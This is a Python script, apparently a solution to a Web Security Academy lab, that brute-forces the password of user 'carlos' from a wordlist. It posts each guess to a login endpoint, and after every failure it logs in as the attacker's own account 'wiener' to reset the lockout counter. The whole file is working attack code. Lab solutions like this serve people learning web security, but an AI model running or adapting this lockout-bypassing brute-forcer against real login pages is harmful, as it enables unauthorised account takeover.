import requests
import sys
if len(sys.argv) > 1:
    lab_url = sys.argv[1]
else:
    print("Usage" + sys.argv[0] + " lab_URL")
    print("Example :- " + sys.argv[0] +" https://ac931f751e78bf8ac0bd5d8e00610022.web-security-academy.net")
    exit()


pass_list = []

with open('pass.txt', 'r') as passes:
    x = passes.read()
    pass_list = x.split("\n")

url = lab_url + ":443/login"
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": lab_url, "Referer": lab_url + "/login", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers", "Connection": "close"}
data = {"username": "wiener", "password": "peter"}


for creds in pass_list:
    data2 = {"username": "carlos", "password": creds}
    r = requests.post(url, headers=headers, data=data2, allow_redirects=False)
    if r.status_code == 302:
        print("================ + Sucess + ==============   ====>" + creds)
        break
    else:
        requests.post(url, headers=headers, data=data, allow_redirects=False)
